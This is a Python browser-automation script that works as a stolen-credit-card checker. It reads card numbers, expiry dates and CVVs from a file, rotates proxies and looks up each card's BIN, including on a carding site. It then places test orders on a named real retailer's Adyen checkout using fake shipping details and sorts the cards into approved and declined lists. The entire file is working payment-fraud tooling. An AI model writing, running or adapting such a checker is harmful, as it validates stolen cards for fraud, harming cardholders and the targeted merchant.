#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# developer: wortexbabax

import os
import re
import sys
import json
import time
import threading
import requests
from pathlib import Path
from datetime import datetime

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

PRODUCT_URL = os.environ.get("PRODUCT_URL", "https://houseoffly.com/simms-mens-tarponwear-tshirt")
CC_FILE = os.environ.get("CC_FILE", "cc.txt")
APPROVED_FILE = os.environ.get("APPROVED_FILE", "approved.txt")
DECLINED_FILE = os.environ.get("DECLINED_FILE", "declined.txt")
PROXY_FILE = os.environ.get("PROXY_FILE", "proxy.txt")

HEADLESS = os.environ.get("HEADLESS", "1") == "1"
TIMEOUT = int(os.environ.get("TIMEOUT", "30000"))
SLOW_MO = int(os.environ.get("SLOW_MO", "50"))

SHIPPING = {
    "email": "adasdsa@gmail.com",
    "firstname": "asdas",
    "lastname": "dasdas",
    "street": "dasdas",
    "street2": "das",
    "street3": "das",
    "city": "sdasdas",
    "region": "Federated States Of Micronesia",
    "region_id": "17",
    "postcode": "53423",
    "country": "US",
    "telephone": "5342323253",
}

APPROVE_KEYWORDS = [
    "success", "approved", "approve", "charged", "payment successful",
    "payment was successful", "thank you", "order confirmation",
    "your order number is", "order placed", "transaction approved",
]
DECLINE_KEYWORDS = [
    "refused", "declined", "decline", "rejected", "not authorized",
    "not authorised", "insufficient funds", "invalid card",
    "incorrect", "verification failed", "cvc", "cvv", "expired",
    "pick up card", "restricted", "try another", "could not be processed",
]

approved_lock = threading.Lock()
declined_lock = threading.Lock()
print_lock = threading.Lock()


def log(msg):
    now = datetime.now().strftime("%H:%M:%S")
    with print_lock:
        print(f"[{now}] {msg}", flush=True)


def write_result(path, line):
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def parse_cards(path):
    cards = []
    if not Path(path).exists():
        Path(path).write_text("", encoding="utf-8")
        return cards

    for raw in Path(path).read_text(encoding="utf-8").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"[\|\/\s,]+", line)
        if len(parts) < 4:
            continue
        cc = parts[0].strip().replace(" ", "")
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        if not re.fullmatch(r"\d{13,19}", cc):
            continue
        cards.append({"cc": cc, "mm": mm, "yy": yy, "cvv": cvv, "raw": line})
    return cards


def load_proxies(path):
    proxies = []
    if not Path(path).exists():
        return proxies
    for line in Path(path).read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            proxies.append(line)
    return proxies


def lookup_bin(cc):
    bin_num = cc[:6]
    apis = [
        f"https://bins.antipublic.cc/bins/{bin_num}",
        f"https://lookup.binlist.net/{bin_num}",
    ]
    for url in apis:
        try:
            r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code != 200:
                continue
            data = r.json()
            brand = data.get("brand", data.get("scheme", "")).upper()
            ctype = data.get("type", "").upper()
            bank = data.get("bank", "")
            if isinstance(bank, dict):
                bank = bank.get("name", "")
            country = data.get("country", "")
            country_name = ""
            flag = ""
            if isinstance(data.get("country"), dict):
                country = data["country"].get("alpha2", "")
                country_name = data["country"].get("name", "")
                flag = data["country"].get("emoji", "")
            else:
                country_name = data.get("country_name", "")
                flag = data.get("country_flag", "")
            return {
                "brand": brand or "UNKNOWN",
                "type": ctype or "UNKNOWN",
                "bank": bank or "UNKNOWN BANK",
                "country": country or country_name or "UNKNOWN",
                "flag": flag,
            }
        except Exception:
            continue
    return {
        "brand": "UNKNOWN",
        "type": "UNKNOWN",
        "bank": "UNKNOWN BANK",
        "country": "UNKNOWN",
        "flag": "",
    }


def classify_response(text):
    lower = text.lower()
    for kw in APPROVE_KEYWORDS:
        if kw in lower:
            return "approved"
    for kw in DECLINE_KEYWORDS:
        if kw in lower:
            return "declined"
    if "message" in lower or "error" in lower:
        return "declined"
    return "unknown"


def normalize_year(yy):
    yy = yy.strip()
    if len(yy) == 2:
        prefix = "20" if int(yy) < 50 else "19"
        return prefix + yy
    return yy


def fill_adyen_iframe(page, field_type, value, max_attempts=5):
    field_type = field_type.lower()
    for _ in range(max_attempts):
        for frame in page.frames:
            try:
                candidates = []
                selectors = [
                    'input[aria-label]',
                    'input[placeholder]',
                    'input[name]',
                    'input[data-fieldtype]',
                    'input[type="tel"]',
                    'input[type="text"]',
                ]
                for sel in selectors:
                    try:
                        for el in frame.locator(sel).all():
                            try:
                                ph = (el.get_attribute("placeholder") or "").lower()
                                al = (el.get_attribute("aria-label") or "").lower()
                                name = (el.get_attribute("name") or "").lower()
                                dtype = (el.get_attribute("data-fieldtype") or "").lower()
                                candidates.append((el, ph, al, name, dtype))
                            except Exception:
                                continue
                    except Exception:
                        continue

                for el, ph, al, name, dtype in candidates:
                    match = False
                    if field_type == "number":
                        match = ("number" in al or "cardnumber" in name or
                                 "card number" in ph or dtype == "encryptedcardnumber")
                    elif field_type == "expiry":
                        match = ("expir" in al or "expiry" in name or
                                 "mm/yy" in ph or dtype == "encryptedexpirydate")
                    elif field_type == "cvc":
                        match = ("cvc" in al or "cvv" in al or "security" in name or
                                 "cvc" in ph or "cvv" in ph or
                                 dtype == "encryptedsecuritycode")
                    elif field_type == "holder":
                        match = ("holder" in al or "holder" in name or
                                 "name" in ph or dtype == "holdername")
                    if match:
                        el.fill(value)
                        return True
            except Exception:
                continue
        time.sleep(0.7)
    return False


def check_card(card, proxy=None):
    result = {"status": "error", "detail": "unknown error"}
    response_text = ""

    with sync_playwright() as p:
        launch_args = {"headless": HEADLESS, "slow_mo": SLOW_MO}
        if proxy:
            if "@" in proxy:
                auth, hostport = proxy.rsplit("@", 1)
                user, pwd = auth.split(":", 1)
                launch_args["proxy"] = {
                    "server": f"http://{hostport}",
                    "username": user,
                    "password": pwd,
                }
            else:
                launch_args["proxy"] = {"server": f"http://{proxy}"}

        try:
            browser = p.chromium.launch(**launch_args)
        except Exception as e:
            return card, {"status": "error", "detail": f"browser launch: {e}"}

        context = browser.new_context(
            viewport={"width": 1920, "height": 1080},
            locale="en-US",
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
            ),
        )

        page = context.new_page()
        page.set_default_timeout(TIMEOUT)

        try:
            responses = []

            def handle_response(resp):
                url = resp.url
                if "/rest/" in url and any(x in url for x in ["/payment-information", "/set-payment-information", "/totals-information"]):
                    try:
                        body = resp.text()
                    except Exception:
                        body = ""
                    responses.append({"url": url, "status": resp.status, "body": body})

            page.on("response", handle_response)

            page.goto(PRODUCT_URL, wait_until="domcontentloaded")
            page.wait_for_load_state("networkidle")

            try:
                page.click('button:has-text("Accept All")', timeout=5000)
                time.sleep(0.5)
            except Exception:
                pass

            try:
                page.click('.swatch-attribute.color .swatch-option[option-id="14968"]', timeout=10000)
                time.sleep(0.3)
            except Exception:
                pass
            try:
                page.click('.swatch-attribute.size .swatch-option[option-id="15481"]', timeout=10000)
                time.sleep(0.3)
            except Exception:
                pass

            try:
                with page.expect_response(lambda r: "/checkout/cart/add/" in r.url, timeout=20000):
                    page.click('button#product-addtocart-button')
            except Exception:
                page.click('button#product-addtocart-button')
                page.wait_for_load_state("networkidle")

            try:
                page.wait_for_selector(".message-success", timeout=15000)
            except PlaywrightTimeout:
                pass
            time.sleep(1)

            page.goto("https://houseoffly.com/checkout/", wait_until="load")
            page.wait_for_selector('input[name="street[0]"]', timeout=60000)
            time.sleep(2)

            for email_sel in ['input[name="username"]', '#customer-email-fieldset input[name="username"]', 'input[name="customer-email"]']:
                try:
                    page.fill(email_sel, SHIPPING["email"], timeout=5000)
                    break
                except Exception:
                    continue

            page.fill('input[name="street[0]"]', SHIPPING["street"])
            page.fill('input[name="street[1]"]', SHIPPING["street2"])
            page.fill('input[name="street[2]"]', SHIPPING["street3"])
            page.fill('input[name="city"]', SHIPPING["city"])
            page.fill('input[name="postcode"]', SHIPPING["postcode"])
            page.fill('input[name="telephone"]', SHIPPING["telephone"])
            page.fill('input[name="firstname"]', SHIPPING["firstname"])
            page.fill('input[name="lastname"]', SHIPPING["lastname"])

            try:
                page.wait_for_selector('select[name="region_id"]', timeout=8000)
                page.select_option('select[name="region_id"]', SHIPPING["region_id"], timeout=5000)
            except Exception:
                try:
                    page.evaluate(f'document.querySelector(\'select[name="region_id"]\').value = "{SHIPPING["region_id"]}"')
                except Exception:
                    pass
            try:
                page.select_option('select[name="country_id"]', SHIPPING["country"], timeout=5000)
            except Exception:
                pass

            try:
                page.wait_for_selector('input[type="radio"][name^="shipping"], .table-checkout-shipping-method', timeout=30000)
                checked = page.locator('input[type="radio"][name^="shipping"]:checked').count()
                if checked == 0:
                    try:
                        page.click('input[type="radio"][name^="shipping"]:not(:disabled)', timeout=10000)
                    except Exception:
                        pass
                time.sleep(1)
            except Exception:
                pass

            try:
                page.click('button.action.continue.primary', timeout=15000)
            except Exception:
                try:
                    page.click('button[data-role="opc-continue"]', timeout=15000)
                except Exception:
                    pass
            time.sleep(4)

            try:
                page.wait_for_selector('input[type="radio"][name="payment[method]"]', timeout=30000)
                checked = page.locator('input[type="radio"][name="payment[method]"]:checked').count()
                if checked == 0:
                    try:
                        page.locator('input[type="radio"][name="payment[method]"][value="adyen_cc"]').first.click(force=True, timeout=10000)
                    except Exception:
                        try:
                            page.locator('label[for="adyen_cc"]').first.click(force=True, timeout=10000)
                        except Exception:
                            page.locator('input[type="radio"][name="payment[method]"]:not(:disabled)').first.click(force=True, timeout=10000)
                time.sleep(3)
            except Exception:
                pass

            yy = normalize_year(card["yy"])
            time.sleep(2)
            fill_adyen_iframe(page, "number", card["cc"])
            fill_adyen_iframe(page, "expiry", f"{card['mm'].zfill(2)}/{yy[-2:]}")
            fill_adyen_iframe(page, "cvc", card["cvv"])
            fill_adyen_iframe(page, "holder", "jsmith")
            time.sleep(1)

            try:
                btn = page.locator('button.action.primary.checkout').first
                btn.scroll_into_view_if_needed(timeout=10000)
                try:
                    page.wait_for_function(
                        "() => { const b = document.querySelector('button.action.primary.checkout'); return b && !b.disabled; }",
                        timeout=15000,
                    )
                except Exception:
                    pass
                btn.click(force=True, timeout=15000)
            except Exception:
                try:
                    page.locator('button[title="Place Order"]').first.click(force=True, timeout=15000)
                except Exception:
                    pass

            try:
                page.wait_for_url("**/checkout/onepage/success/**", timeout=25000)
                result = {"status": "approved", "detail": "redirected to success page"}
            except PlaywrightTimeout:
                time.sleep(5)

            if result["status"] != "approved":
                final_response = ""
                payment_responses = [r for r in responses if "/payment-information" in r["url"]]
                if payment_responses:
                    for r in reversed(payment_responses):
                        if r["status"] >= 400 or r["body"]:
                            final_response = r["body"]
                            break
                    if not final_response:
                        final_response = payment_responses[-1]["body"]
                if not final_response:
                    try:
                        final_response = page.inner_text(
                            '.message-error, .checkout-payment-method .message, [data-role="grid-wrapper"] .message',
                            timeout=5000,
                        )
                    except Exception:
                        final_response = response_text
                if not final_response:
                    final_response = "No payment response captured"

                clean_detail = final_response
                try:
                    parsed = json.loads(final_response)
                    if isinstance(parsed, dict):
                        if "message" in parsed:
                            clean_detail = parsed["message"]
                        elif "error" in parsed and isinstance(parsed["error"], dict):
                            clean_detail = parsed["error"].get("message", final_response)
                except Exception:
                    pass

                status = classify_response(clean_detail)
                if status != "approved" and payment_responses:
                    last_status = payment_responses[-1].get("status", 200)
                    if last_status >= 400:
                        status = "declined"
                result = {"status": status, "detail": clean_detail}

        except Exception as e:
            result = {"status": "error", "detail": str(e)}
        finally:
            try:
                browser.close()
            except Exception:
                pass

    return card, result


def process_card(card, proxy=None):
    bin_info = lookup_bin(card["cc"])
    yyyy = normalize_year(card["yy"])
    card_display = f"{card['cc']}|{card['mm'].zfill(2)}|{yyyy}|{card['cvv']}"
    info_display = f"{bin_info['brand']} - {bin_info['type']} - {bin_info['bank']} - {bin_info['country']} {bin_info['flag']}".strip()

    card, result = check_card(card, proxy)

    detail = result["detail"].replace("\n", " ").strip()
    line = f"{card_display} | {result['status'].upper()} | {detail} | {info_display}"
    console_line = f"{'✅' if result['status'] == 'approved' else '❌'} {result['status'].upper()} | {card_display} | {detail} | {info_display}"

    if result["status"] == "approved":
        with approved_lock:
            write_result(APPROVED_FILE, line)
        log(f"{console_line}")
    elif result["status"] == "declined":
        with declined_lock:
            write_result(DECLINED_FILE, line)
        log(f"{console_line}")
    else:
        with declined_lock:
            write_result(DECLINED_FILE, line)
        log(f"❓ UNKNOWN/ERROR | {card_display} | {detail} | {info_display}")


def main():
    cards = parse_cards(CC_FILE)
    if not cards:
        log("[!] No cards to check. Add cards to cc.txt")
        sys.exit(1)

    proxies = load_proxies(PROXY_FILE)

    for f in (APPROVED_FILE, DECLINED_FILE):
        Path(f).touch(exist_ok=True)

    for idx, card in enumerate(cards, 1):
        proxy = proxies[idx % len(proxies)] if proxies else None
        process_card(card, proxy)


if __name__ == "__main__":
    main()
